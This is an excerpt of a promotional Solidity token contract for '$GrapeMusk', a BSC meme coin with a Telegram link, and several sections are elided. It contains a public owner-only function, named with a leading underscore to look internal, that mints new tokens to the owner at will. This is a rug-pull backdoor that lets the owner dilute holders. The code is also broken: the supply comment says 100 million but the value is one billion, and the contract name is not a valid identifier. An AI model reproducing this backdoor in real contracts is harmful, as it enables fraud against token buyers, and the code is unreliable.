...
//
// $GrapeMusk proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/GrapeMuskBSC
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Grapemusk(uint256 amount) public onlyOwner {
 _Grapemusk(msg.sender, amount);
    }
    ...
    function _Grapemusk(address account, uint256 amount) internal virtual {
...
contract $GrapeMusk is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Grape Musk", "GRAPEMUSK") {
        _Grapemusk(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}